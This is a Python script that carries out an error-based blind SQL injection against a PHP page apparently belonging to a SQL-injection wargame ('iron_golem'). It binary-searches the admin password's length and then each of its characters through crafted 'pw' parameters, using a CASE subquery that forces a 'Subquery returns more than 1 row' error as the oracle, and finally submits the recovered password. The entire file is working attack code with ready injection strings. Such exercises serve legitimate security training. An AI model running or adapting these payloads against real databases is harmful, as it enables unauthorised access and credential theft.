import requests

url = 'https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php'

cookies = {
	'__cfduid': '',
	'PHPSESSID': ''
}

payload = {
	'pw': ''
}

# Guess the length of password.
low, high = 0, 128
while True:
	mid = int((low + high) / 2)
	sqli = '\' or id = \'admin\' and 1 = (case when length(pw) < %d then (SELECT 1 UNION ALL SELECT 4 UNION ALL SELECT 7) else 1 end) -- ' % mid
	payload['pw'] = sqli
	res = requests.get(url, cookies=cookies, params=payload)
	if res.text.find('Subquery returns more than 1 row') > -1:
		high = mid
		print('Go lower to %d...' % mid)
	else:
		low = mid
		print('Go higher to %d...' % mid)
	
	if high - low <= 1:
		break
len_of_pw = low
print('The length of pw is %d.' % len_of_pw)

# Guess the password one by one.
pw = ''
for i in range(len_of_pw+1):
	low, high = 0, 127
	
	while True:
		mid = int((low + high) / 2)
		sqli = '\' or id = \'admin\' and 1 = (case when ord(mid(pw,%d,1)) < %d then (SELECT 1 UNION ALL SELECT 4 UNION ALL SELECT 7) else 1 end) -- ' % (i, mid)
		payload['pw'] = sqli
		res = requests.get(url, cookies=cookies, params=payload)
		if res.text.find('Subquery returns more than 1 row') > -1:
			high = mid
			print('Go lower to %c(%d)...' % (chr(mid), mid))
		else:
			low = mid
			print('Go higher to %c(%d)...' % (chr(mid), mid))

		if high - low <= 1:
			break
	pw = pw + str(chr(low))
	print('Sniff Sniff...', pw)
print('The password is', pw)

payload['pw'] = pw
res = requests.get(url, cookies=cookies, params=payload)
print(res.text)